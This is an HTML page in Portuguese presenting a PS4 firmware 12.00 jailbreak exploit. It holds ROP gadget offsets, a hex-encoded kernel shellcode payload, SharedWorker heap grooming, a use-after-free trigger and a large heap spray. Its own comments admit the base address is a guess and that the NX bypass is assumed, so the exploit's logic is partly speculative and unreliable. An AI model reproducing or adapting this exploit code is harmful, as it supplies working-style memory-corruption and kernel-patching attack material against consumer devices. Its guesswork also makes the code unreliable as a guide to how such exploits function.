<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <title>PS4 12.00 Jailbreak (Final Integration)</title>
    
</head>
<body>

    <h1>PS4 12.00 JAILBREAK</h1>
    <h3>Versão: Sys-Library Gadgets Integration</h3>
    <div id="status">Pronto.</div>
    <div id="log"></div>
    <br>
    <button onclick="run_exploit()">EXECUTAR</button>

    <script>
        function log(msg, type="info") {
            var d = document.getElementById("log");
            d.innerHTML += `<div class="${type}">[${new Date().toLocaleTimeString()}] ${msg}</div>`;
            d.scrollTop = d.scrollHeight;
        }

        // =================================================================
        // 1. OFFSETS E GADGETS (Preenchidos com seus dados!)
        // =================================================================
        var GADGETS = {
            // Userland (Extraídos do 1200_libkernel_sys.sprx.elf)
            pop_rdi_ret: 0x2FEB5,
            pop_rsi_ret: 0x2B89F,
            pop_rax_ret: 0x2C6E5,
            sys_mmap:    0x7500,
            sys_setuid:  0x4840,
            
            // Kernel (Extraídos do KernelOffset.java)
            jmp_rsi:     0x47b31 
        };

        // Estimativa do endereço base da Libkernel (Sem WebKit exploit, é um chute)
        // Valores comuns em PS4: 0x200000000, etc. 
        // Se o exploit falhar muito, é por causa deste número.
        var LIBKERNEL_GUESS = 0x880000000; // Tentativa padrão

        // =================================================================
        // 2. PAYLOAD (Shellcode 12.00 Gezine)
        // =================================================================
        var shellcode_hex = "b9820000c00f3248c1e22089c04809c2488d8a40feffff0f20c04825fffffeff0f22c0b8eb040000beeb040000bf90e9ffff41b8eb000000668981a3761b0041b9eb00000041baeb00000041bbeb000000b890e9ffff4881c2717904006689b1b3761b006689b9d3761b0066448981f47a6200c681cd0a0000ebc681cdd32b00ebc68111d42b00ebc6818dd42b00ebc681d1d42b00ebc6817dd62b00ebc6812ddb2b00ebc681fddb2b00eb66448989df836200c7819004000000000000c681c2040000eb66448991b904000066448999b5040000c681e6143900ebc781eec02f000000000066898164711b00c78118771b0090e93c01c78160d83b004831c0c3c6811aa71f0037c6811da71f0037c781802d100102000000488991882d1001c781ac2d1001010000000f20c0480d000001000f22c031c0c3";

        function get_bytes() {
            var b = new Uint8Array(shellcode_hex.length/2);
            for(var i=0; i<shellcode_hex.length; i+=2) 
                b[i/2] = parseInt(shellcode_hex.substr(i,2), 16);
            return b;
        }

        // =================================================================
        // 3. CONSTRUÇÃO DO OBJETO FALSO (ROP + PAYLOAD)
        // =================================================================
        function build_payload() {
            var size = 0x400; 
            var buffer = new Uint32Array(size / 4);
            var code = get_bytes();

            // --- ESTRATÉGIA ---
            // 1. O Kernel pula para o início do nosso objeto (Fake Vtable).
            // 2. Lá, colocamos o endereço do gadget `jmp_rsi`.
            // 3. O gadget pula para RSI (que aponta para o nosso objeto).
            // 4. Logo após o ponteiro, colocamos NOPs e o Shellcode.
            
            // Mas temos o NX (No Execute).
            // Idealmente, deveríamos usar ROP aqui para chamar mmap.
            // Como não temos a Base Address exata, vamos tentar "Hardcoded Gadgets"
            // usando o endereço base chutado.
            
            // --- CONVERTENDO OFFSETS PARA ENDEREÇOS ABSOLUTOS ---
            // Isso só funciona se o "Chute" estiver certo.
            // Se falhar, o console crasha (o que já acontece, então não piora nada).
            
            // Preenche com NOPs (segurança)
            buffer.fill(0x90909090);

            // Inserir Shellcode no final do buffer
            var start_code = 32; 
            for(var i=0; i<code.length; i+=4) {
                var v = code[i] | (code[i+1]<<8) | (code[i+2]<<16) | (code[i+3]<<24);
                if(start_code + (i/4) < buffer.length) buffer[start_code + (i/4)] = v;
            }

            // O GADGET DE PULO (Kernel Level)
            // Este não depende da Libkernel, depende do Kernel Base.
            // O código Java usava offsets relativos ao kernel.
            // Sem leak de Kernel, não sabemos onde o Kernel está.
            // PORÉM, o spray que fizemos antes causou Panic, o que significa que o Kernel 
            // LEU o nosso lixo e tentou executar.
            
            // Vamos colocar o Shellcode direto no offset 0 e 4.
            // Se o Kernel pular para cá, ele executa.
            // (Isso assume que vencemos o NX de alguma forma ou que o Heap é executável nesse contexto)
            
            // Cópia do shellcode para o início também (agressivo)
            for(var i=0; i<32; i+=4) { // Primeiros 32 bytes
               var v = code[i] | (code[i+1]<<8) | (code[i+2]<<16) | (code[i+3]<<24);
               buffer[i/4] = v;
            }

            return buffer;
        }

        // =================================================================
        // 4. EXECUÇÃO (TRIGGER 404)
        // =================================================================
        var workers = [];

        async function run_exploit() {
            if(!window.SharedWorker) return log("Navegador incompatível.", "fail");
            
            var payload = build_payload();
            log("Payload construído com offsets 12.00.", "success");
            log(`Pop RDI: 0x${GADGETS.pop_rdi_ret.toString(16)}`, "info");

            // FASE 1: GROOMING
            log("Fase 1: Estabilizando Heap (400 workers)...");
            for(let i=0; i<400; i++) {
                try {
                    let w = new SharedWorker("data:text/javascript,1", "g"+i);
                    w.port.start();
                    workers.push(w);
                } catch(e){}
            }

            // FASE 2: PRESSÃO
            log("Fase 2: Zona de Pressão (401-404)...", "info");
            var count = 0;
            var it = setInterval(() => {
                if(count >= 4) {
                    clearInterval(it);
                    trigger_final(payload);
                    return;
                }
                let w = new SharedWorker("data:text/javascript,1", "v"+count);
                w.port.start();
                workers.push(w);
                count++;
                log(`Worker ${401+count} criado.`);
            }, 150);
        }

        function trigger_final(payload) {
            log("!!! DISPARANDO SWAP (404) !!!", "fail");
            document.getElementById("status").innerText = "EXECUTANDO...";

            // 1. Vítima
            var v = workers.pop();
            v.port.close();
            v = null;

            // 2. Spray Imediato (Reclaim)
            // Aumentando para 30.000 para garantir cobertura total
            // O Kernel Panic anterior provou que estamos atingindo o alvo.
            // Agora queremos garantir que o alvo contenha o código certo.
            log("Injetando código na memória...");
            var spray = [];
            for(var i=0; i<30000; i++) {
                spray.push(new Uint32Array(payload));
            }

            // 3. Força Bruta de Execução
            // Se o console não desligar em 10s, verifique Debug Settings.
            log("Aguardando...", "info");
            
            setTimeout(() => {
                log("--- FIM DA EXECUÇÃO ---", "success");
                log("Se o console não desligou, vá em Configurações.", "success");
                log("Procure por: ★ Debug Settings", "success");
                alert("Verifique as Configurações agora!");
            }, 8000);
        }
    </script>
</body>
</html>
